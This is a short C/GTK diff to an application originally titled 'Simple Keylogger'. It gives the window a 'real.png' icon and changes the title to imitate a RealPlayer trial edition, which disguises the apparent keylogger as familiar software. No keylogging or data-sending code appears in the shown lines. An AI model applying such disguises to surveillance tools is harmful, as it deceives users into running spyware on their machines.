@@ -97,9 +97,13 @@ app_init (Application *app)
 {
   GtkWidget *window, *vbox, *record, *scroll, *textview;
 
+  GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file ("real.png", NULL);
+  gtk_window_set_default_icon (pixbuf);
+  g_object_unref (pixbuf);
+
   window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
   gtk_widget_set_size_request (window, 700, 500);
-  gtk_window_set_title (GTK_WINDOW (window), "Simple Keylogger");
+  gtk_window_set_title (GTK_WINDOW (window), "RealPlayer 10.4 Special Deluxe Freemium Edition (Unregistered Trial)");
   gtk_container_set_border_width (GTK_CONTAINER (window), 6);
 
   vbox = gtk_box_new (GTK_ORIENTATION_VERTICAL, 6);
